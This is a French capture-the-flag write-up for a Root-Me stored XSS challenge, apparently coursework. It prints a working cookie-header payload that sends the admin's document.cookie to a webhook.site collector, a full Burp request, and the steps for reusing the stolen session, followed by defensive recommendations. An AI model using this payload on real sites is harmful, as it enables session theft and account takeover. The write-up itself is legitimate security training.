# Challenge 9: XSS - Stockée 2

## Nom / URL

**Nom du challenge :** XSS - Stockée 2
**URL :** https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2

## Les étapes de découverte de la vulnérabilité

1. **Reconnaissance et analyse initiale :**

   - L'application propose un formulaire avec deux champs : "Titre" et "Message"
   - Test initial : Tentative d'injection directe de balises `<script>` dans ces champs
   - **Échec** : Le serveur sanitize les entrées en convertissant les caractères spéciaux en entités HTML
   - Observation : Les caractères `<` sont convertis en `&lt;`, empêchant l'exécution de code JavaScript
2. **Découverte de la vulnérabilité :**

   - Analyse du code source HTML de la page après soumission du formulaire
   - **Découverte clé** : Le contenu du cookie `status=invite` est reflété tel quel dans le code HTML de la page
   - Le cookie est injecté dans une balise `<i>` sans aucune protection ou encodage
   - Cette injection se produit côté serveur lors du rendu de la page, contournant la sanitisation des champs de formulaire
3. **Préparation de l'attaque (Le "Sniffer") :**

   - **Problème** : On ne peut pas voir l'écran de la victime (l'admin) qui visitera la page
   - **Solution** : Utilisation de **Webhook.site** comme serveur tiers pour "écouter" et récupérer les données
   - Webhook.site génère une URL unique qui permet de recevoir et visualiser les requêtes HTTP en temps réel
   - Cette URL servira de point de collecte pour exfiltrer le cookie de session de l'administrateur
4. **Exploitation via Burp Suite :**

   - Interception de la requête HTTP POST lors de la soumission du formulaire
   - Modification de la requête dans Burp Suite Repeater
   - **Manipulation du header Cookie** : Remplacement de la valeur du cookie `status`
   - **Payload injectée dans le cookie** : `status=invite"><img src=x onerror=document.location='https://webhook.site/TON-UUID/?c='%2Bdocument.cookie>`
   - **Point technique important** : Encodage du caractère `+` en `%2B` pour qu'il soit interprété comme une concaténation JavaScript et non comme un espace URL lors du décodage
5. **Exfiltration et vol de session :**

   - Le serveur stocke le cookie malveillant dans la base de données
   - Lorsque le bot admin visite la page, le cookie est injecté dans le HTML
   - Le script JavaScript s'exécute : `<img src=x onerror=...>` déclenche une erreur (image inexistante)
   - L'événement `onerror` exécute `document.location='https://webhook.site/UUID/?c='+document.cookie`
   - Le navigateur de l'admin envoie une requête GET au Webhook avec le cookie complet en paramètre
   - Le cookie de session administrateur est ainsi exfiltré et visible sur Webhook.site
6. **Validation du challenge :**

   - Récupération du cookie administrateur depuis Webhook.site
   - Modification du cookie dans le navigateur (via DevTools ou Burp Suite)
   - Remplacement du cookie utilisateur par le cookie administrateur volé
   - Accès aux fonctionnalités administrateur et validation du challenge

## Le payload utilisé + screenshot

**Payload utilisé dans le header Cookie :**

```
status=invite"><img src=x onerror=document.location='https://webhook.site/TON-UUID/?c='%2Bdocument.cookie>
```

**Requête HTTP complète (Burp Suite Repeater) :**

```
POST /challenge HTTP/1.1
Host: vulnerable-website.com
Cookie: status=invite"><img src=x onerror=document.location='https://webhook.site/TON-UUID/?c='%2Bdocument.cookie>
Content-Type: application/x-www-form-urlencoded
Content-Length: XX

titre=Test&message=Test
```

**Explication du payload :**

- **`status=invite"`** : Ferme la valeur du cookie et échappe la guillemet
- **`>`** : Ferme la balise HTML où le cookie est injecté
- **`<img src=x`** : Crée une balise image avec une source invalide pour déclencher une erreur
- **`onerror=...`** : Gestionnaire d'événement qui s'exécute lorsque l'image ne peut pas être chargée
- **`document.location='https://webhook.site/UUID/?c='`** : Redirige vers le Webhook avec un paramètre `c`
- **`%2Bdocument.cookie`** : Concatène le cookie (le `+` est encodé en `%2B` pour éviter l'interprétation comme espace)
- **Résultat** : Le cookie complet est envoyé à Webhook.site dans l'URL

**Screenshots :**

![Screenshot Retrieve Admin Cookie](img/challenge-9-retrieve-admin-cookie.png)

![Screenshot Get Admin Cookie Webhook](img/challenge-9-get-admin-cookie-webhook.png)

![Screenshot Using Admin Cookie](img/challenge-9-using-admin-cookie.png)

![Screenshot Solution](img/challenge-9-solution.png)

## Les recommandations pour sécuriser cette vulnérabilité

### 1. Encodage et sanitisation des cookies

- **Encoder toutes les valeurs de cookie** : Ne jamais injecter directement le contenu des cookies dans le HTML sans encodage
- **Utiliser l'encodage HTML** : Convertir les caractères spéciaux (`<`, `>`, `"`, `'`, `&`) en entités HTML avant injection
- **Validation stricte** : Valider le format et le contenu des cookies avant leur utilisation

### 2. Content Security Policy (CSP)

- **Implémenter une CSP stricte** : Utiliser des directives CSP pour empêcher l'exécution de JavaScript inline
- **Interdire `onerror` et autres handlers inline** : Bloquer les attributs d'événement inline dans les balises HTML
- **Whitelist des domaines** : Autoriser uniquement les domaines de confiance pour les requêtes externes

### 3. Validation et filtrage des entrées

- **Valider tous les points d'entrée** : Ne pas se limiter aux champs de formulaire, valider aussi les headers HTTP
- **Whitelist des valeurs de cookie** : Utiliser une liste blanche pour les valeurs de cookie autorisées
- **Rejeter les caractères dangereux** : Filtrer ou rejeter les caractères spéciaux dans les cookies

### 4. Séparation des données et du code

- **Ne jamais injecter de données utilisateur dans le HTML** : Utiliser des attributs `data-*` ou des variables JavaScript séparées
- **Utiliser des frameworks sécurisés** : Utiliser des frameworks qui gèrent automatiquement l'échappement
- **Principe de moindre privilège** : Ne stocker que les données nécessaires dans les cookies

### 5. Monitoring et détection

- **Détecter les tentatives d'exfiltration** : Surveiller les requêtes vers des domaines externes suspects
- **Logs de sécurité** : Enregistrer toutes les tentatives d'injection et d'accès aux cookies
- **Alertes en temps réel** : Mettre en place des alertes pour les activités suspectes

## Références

**Source principale des recommandations :**

- **OWASP - Cross-Site Scripting (XSS)** : https://owasp.org/www-community/attacks/xss/
  - Cette page OWASP fournit des informations détaillées sur les attaques XSS et les meilleures pratiques de sécurisation

**Références complémentaires :**

- **OWASP - XSS Prevention Cheat Sheet** : https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

  - Guide pratique pour prévenir les vulnérabilités XSS avec des exemples de code
- **PortSwigger Web Security Academy - Cross-site scripting** : https://portswigger.net/web-security/csrf

  - Documentation officielle de PortSwigger sur les vulnérabilités XSS et les techniques d'exploitation
- **Content Security Policy (CSP)** : https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

  - Documentation sur l'implémentation de Content Security Policy pour prévenir les attaques XSS
- **CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')** : https://cwe.mitre.org/data/definitions/79.html

  - Classification CWE de cette vulnérabilité avec des exemples et des solutions
- **OWASP Top 10 - A03:2021 Injection** : https://owasp.org/Top10/A03_2021-Injection/

  - Les vulnérabilités XSS font partie de la catégorie Injection de l'OWASP Top 10
